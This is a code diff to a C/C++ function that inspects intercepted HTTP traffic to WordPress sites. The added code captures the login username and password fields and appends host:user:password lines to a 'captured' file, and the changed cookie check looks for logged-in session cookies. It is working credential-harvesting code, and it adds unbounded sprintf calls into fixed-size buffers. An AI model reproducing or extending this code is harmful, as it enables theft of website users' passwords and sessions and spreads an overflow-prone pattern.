@@ -86,14 +86,15 @@ bool handleWordpress(char *srcIp, int srcPort, char *dstIp, int dstPort, const u
 
 
                 char httpPostArgs[2048] = { 0 };
-                memcpy(httpPostArgs, request.content.data(), strlen(request.content.data()));
+                sprintf(httpPostArgs, "%s&", request.content.data());
+                //printf("%s\n", request.content.data());
                 char* argumentStart = httpPostArgs;
-                for (char* pointer = httpPostArgs; pointer[0]!=0; pointer++) {
+                for (char* pointer = httpPostArgs; pointer[0]!='\0'; pointer++) {
                     if(pointer[0] == '&') {
                         char argumentPair[256] = { 0 };
                         memcpy(argumentPair, argumentStart, pointer - argumentStart);
 
-                        for (char* pointer2 = argumentPair; pointer2[0]!=0; pointer2++) {
+                        for (char* pointer2 = argumentPair; pointer2[0]!='\0'; pointer2++) {
                             if(pointer2[0] == '=') {
                                 char key[256] = { 0 }, value[256] = { 0 };
                                 memcpy(key, argumentPair, pointer2 - argumentPair);
@@ -105,6 +106,17 @@ bool handleWordpress(char *srcIp, int srcPort, char *dstIp, int dstPort, const u
 
                                 if(strcmp(key, "log") == 0 || strcmp(key, "pwd") == 0) {
                                     sessionStrings[sessionName][key] = value;
+
+
+                                    if(strcmp(key, "pwd") == 0) {
+                                        char dataToWrite[2048] = { 0 };
+                                        sprintf(dataToWrite, "%s:%s:%s\n", sessionStrings[sessionName]["Host"].c_str(), sessionStrings[sessionName]["log"].c_str(), sessionStrings[sessionName]["pwd"].c_str() );
+
+                                        FILE* pFile = fopen("./captured/wordpressTested.txt", "a");
+                                        fwrite(dataToWrite, sizeof(char), strlen(dataToWrite), pFile);
+                                        fclose(pFile);
+                                    }
+
                                 }
                                 break;
                             }
@@ -147,7 +159,7 @@ bool handleWordpress(char *srcIp, int srcPort, char *dstIp, int dstPort, const u
                         }
                         else if(it->name.compare("Set-Cookie") == 0) {
                             
-                            if(strncmp(it->value.c_str(), "wordpress_", sizeof("wordpress_")-1) == 0) {
+                            if(strncmp(it->value.c_str(), "wordpress_logged_in", sizeof("wordpress_logged_in")-1) == 0) {
                                 char dataToWrite[2048];
                                 sprintf(dataToWrite, "%s:%s:%s\n", sessionStrings[sessionName]["Host"].c_str(), sessionStrings[sessionName]["log"].c_str(), sessionStrings[sessionName]["pwd"].c_str() );
 
